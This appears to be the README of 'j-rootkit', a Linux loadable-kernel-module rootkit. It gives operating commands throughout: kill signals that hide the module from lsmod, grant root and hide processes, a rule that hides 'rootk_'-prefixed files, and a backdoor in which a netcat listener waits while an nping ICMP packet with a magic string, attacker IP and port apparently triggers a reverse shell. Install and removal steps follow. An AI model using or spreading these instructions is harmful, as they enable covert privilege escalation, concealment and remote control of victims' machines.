# j-rootkit
Tested on Ubuntu 22.04 and Debian 12.4

# Usage
Hide/Show rootkit in the list of loaded modules (`$ lsmod`)
```sh
$ kill -63 1
```
When installed it starts hidden. You can only remove it when it's unhidden.

Become root:
```sh
$ kill -64 1
```

Hide process with pid
```sh
$ kill -62 <pid>
```

Unhide process with pid
```sh
$ kill -61 <pid>
```

It also hides every file and directory with prefix `rootk_`.

# Backdoor
On attacker machine start netcat listener on some port:
```sh
$ nc -lnvp <port>
```

Send ICMP ping to victim:
```sh
$ nping --icmp -c 1 -dest-ip <victim-ip> --data-string 'wA@2mC!dq <attacker-ip> <port>'
```

# Install
Compile module and backdoor:
```sh
$ make
$ make install
```

Load module:
```sh
$ sudo insmod build/rootkit.ko
```

# Remove
Make sure the module is visible in `lsmod`. To toggle visibility do `kill -63 1`. Then, remove it with:
```sh
$ sudo rmmod rootkit.ko
```

# References
- [nearly Complete Linux Loadable Kernel Modules](https://web.archive.org/web/20140701183221/https://www.thc.org/papers/LKM_HACKING.html#II.2.1.)
- [linux kernel hacking repo](https://github.com/xcellerator/linux_kernel_hacking)
- [diamorphine](https://github.com/m0nad/Diamorphine)
